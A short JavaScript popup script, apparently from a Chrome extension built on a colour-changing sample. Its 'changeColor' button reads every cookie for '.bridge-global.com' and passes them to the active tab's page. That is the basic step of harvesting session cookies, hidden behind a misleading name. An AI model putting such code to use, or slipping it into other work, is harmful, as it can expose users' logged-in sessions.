let changeColor = document.getElementById('changeColor');

changeColor.onclick = function(element) {
    chrome.tabs.query({active: true, currentWindow: true}, function(tabs) {
        chrome.cookies.getAll({
            domain: ".bridge-global.com"
          }, function (cookies) {
            var data = {cookies: cookies};
            chrome.tabs.sendMessage(tabs[0].id, data);
          });
      });
};


